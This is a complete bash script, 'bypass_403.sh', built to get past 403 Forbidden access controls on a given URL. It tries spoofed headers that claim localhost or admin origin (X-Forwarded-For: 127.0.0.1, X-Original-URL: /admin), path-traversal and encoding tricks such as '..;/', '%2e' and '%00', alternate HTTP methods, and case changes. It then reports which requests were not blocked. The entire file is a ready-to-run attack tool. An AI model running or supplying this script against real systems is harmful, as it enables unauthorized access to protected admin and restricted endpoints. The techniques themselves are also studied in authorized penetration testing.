#!/usr/bin/env bash
# bypass_403.sh — 403 Forbidden bypass matrix.
# Usage: bypass_403.sh "https://target.com/blocked-endpoint"
#
# Techniques (30+):
#   Header tricks: X-Forwarded-For, X-Original-URL, X-Rewrite-URL, X-Custom-IP-Authorization
#   Path tricks: trailing /, //, /./, /../, ;, ;/, %2e, %23, %3f, %2f, ..;/,
#   Encoding: URL encode, double encode, unicode, mixed case
#   Method tricks: POST, PUT, OPTIONS, HEAD, PATCH, DEBUG, TRACE
#   Query tricks: ?param=1, #fragment, %00
set -uo pipefail

URL="${1:-}"
if [ -z "$URL" ]; then
  echo "usage: bypass_403.sh <url>" >&2
  exit 2
fi

BASE="${URL%/}"
echo "◆ 403 bypass matrix → $URL"
echo ""

declare -A seen=()

run() {
  local label="$1" method="$2" path="$3"
  local extra=()
  [ "$method" = "HEAD" ] && extra=(-I)
  code=$(curl -s -o /dev/null -w "%{http_code}" -m 8 "${extra[@]}" -X "$method" "$path" ${4:-} 2>/dev/null)
  if [ "$code" != "403" ] && [ "$code" != "000" ]; then
    key="$method|$path"
    if [ -z "${seen[$key]:-}" ]; then
      echo "  [${code}] $method $path"
      seen[$key]=1
    fi
  fi
}

# --- header-based ---
for h in "X-Forwarded-For: 127.0.0.1" "X-Forwarded-For: 2130706433" \
         "X-Original-URL: /admin" "X-Rewrite-URL: /admin" \
         "X-Custom-IP-Authorization: 127.0.0.1" "X-Forwarded-Host: localhost" \
         "X-Host: localhost" "X-Forwarded-Server: localhost" "X-Real-IP: 127.0.0.1" \
         "X-Client-IP: 127.0.0.1" "X-Remote-IP: 127.0.0.1" "X-Remote-Addr: 127.0.0.1"; do
  run "header $h" GET "$URL" "-H \"$h\""
done

# --- path variants ---
for suffix in "/" "//" "/." "/./" "//./" "/.." "/../" "/.././" "/;/" "/;/..;/" \
              "%2e" "%2e/" "%2e%2e/" "%23" "%3f" "%3f/" "%2f" "%5c" "..;/" \
              "%00" ".json" "?x=1" "#" "/%2e/" "/%2e%2e/"; do
  run "path $suffix" GET "${BASE}${suffix}" ""
done

# --- method-based ---
for m in POST PUT OPTIONS HEAD PATCH DELETE DEBUG TRACE PROPFIND; do
  run "method $m" "$m" "$URL" ""
done

# --- encoding of the whole path ---
ENCPATH=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe='/'))" "$URL")
run "urlencode" GET "$ENCPATH" ""
ENCPATH2=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(urllib.parse.quote(sys.argv[1], safe='/'), safe='/'))" "$URL")
run "double-encode" GET "$ENCPATH2" ""

# --- case variants on last segment ---
LAST="${URL##*/}"
if [ -n "$LAST" ]; then
  run "upper last" GET "${BASE%/*}/$(echo "$LAST" | tr 'a-z' 'A-Z')" ""
  run "lower last" GET "${BASE%/*}/$(echo "$LAST" | tr 'A-Z' 'a-z')" ""
fi

echo ""
echo "[✓] done — non-403 responses listed above"
